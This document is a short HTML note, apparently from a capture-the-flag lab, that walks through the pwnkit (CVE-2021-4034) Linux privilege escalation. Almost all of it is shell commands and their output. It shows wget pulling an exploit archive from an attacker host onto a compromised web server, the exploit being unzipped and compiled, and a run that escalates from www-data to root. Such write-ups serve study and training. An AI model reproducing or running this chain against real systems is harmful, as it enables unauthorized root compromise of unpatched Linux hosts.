<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>pwnkit CVE-2021-4034 Linux PrivEsc</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>pwnkit CVE-2021-4034 Linux PrivEsc</h1><br/><br /><br />d&#39;abord télécharger le zip de la cve 2021-4034 sur Github <br /><br />puis:<br /><br /><strong><h2>$ wget http://attacker.thm:8000/pwnkit.zip</h2></strong><br />--[redacted]--  http://attacker.thm:8000/pwnkit.zip<br />Connecting to attacker.thm:8000... connected.<br />HTTP request sent, awaiting response... 200 OK<br />Length: 6457 (6.3K) [application/zip]<br />Saving to: &#39;pwnkit.zip&#39;0K ......                                                100% 2.42M=0.003s[redacted] (2.42 MB/s) - &#39;pwnkit.zip&#39; saved [6457/6457]<br /><br /><strong>$ unzip pwnkit.zip</strong><br />Archive:  pwnkit.zip<br />55d60e381ef90463ed35f47af44bf7e2fbc150d4<br />   creating: CVE-2021-4034-main/<br />  inflating: CVE-2021-4034-main/.gitignore  <br />  inflating: CVE-2021-4034-main/LICENSE  <br />  inflating: CVE-2021-4034-main/Makefile  <br />  inflating: CVE-2021-4034-main/README.md  <br />  inflating: CVE-2021-4034-main/cve-2021-4034.c  <br />  inflating: CVE-2021-4034-main/cve-2021-4034.sh  <br />   creating: CVE-2021-4034-main/dry-run/<br />  inflating: CVE-2021-4034-main/dry-run/Makefile  <br />  inflating: CVE-2021-4034-main/dry-run/dry-run-cve-2021-4034.c  <br />  inflating: CVE-2021-4034-main/dry-run/pwnkit-dry-run.c  <br />  inflating: CVE-2021-4034-main/pwnkit.c  <br /><strong><h2>$ cd CVE-2021-4034-main/</h2></strong><br /><strong>$ pwd</strong><br />/var/www/html/CVE-2021-4034-main<br /><strong><h2>$ make</h2></strong><br />cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c<br />cc -Wall    cve-2021-4034.c   -o cve-2021-4034<br />echo &quot;module UTF-8// PWNKIT// pwnkit 1&quot; &gt; gconv-modules<br />mkdir -p GCONV_PATH=.<br />cp -f /bin/true GCONV_PATH=./pwnkit.so:.<br /><strong>$ id</strong><br />uid=33(www-data) gid=33(www-data) groups=33(www-data)<br /><strong>$ ls</strong><br />GCONV_PATH=.<br />LICENSE<br />Makefile<br />README.md<br />cve-2021-4034<br />cve-2021-4034.c<br />cve-2021-4034.sh<br />dry-run<br />gconv-modules<br />pwnkit.c<br />pwnkit.so<br /><strong><h2>$ ./cve-2021-4034</h2></strong><br /><strong># id</strong><br />uid=0(root) gid=0(root) groups=0(root),33(www-data)</div></body></html>